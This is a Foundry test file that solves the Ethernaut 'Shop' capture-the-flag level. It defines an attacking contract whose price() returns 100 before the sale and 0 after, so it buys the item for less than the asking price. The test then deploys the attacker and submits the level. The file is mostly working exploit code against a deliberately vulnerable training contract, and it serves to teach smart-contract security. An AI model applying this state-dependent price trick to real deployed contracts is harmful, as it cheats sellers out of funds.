// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Shop/Shop.sol";
import "levels/Shop/ShopFactory.sol";
import "./utils/EthernautTest.sol";

contract ShopHack is Buyer {
    Shop public victim;

    constructor(address _targetAddress) {
        victim = Shop(_targetAddress);
    }

    function price() external view override returns (uint256) {
        return victim.isSold() ? 0 : 100;
    }

    function exploit() external {
        victim.buy();
    }
}

contract ShopTest is Test {
    function test_shop() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        ShopFactory shopFactory = new ShopFactory();
        address levelAddress = ethernautTest.setup(shopFactory);

        // Exploit
        vm.startPrank(tx.origin);
        ShopHack shopHack = new ShopHack(levelAddress);
        shopHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
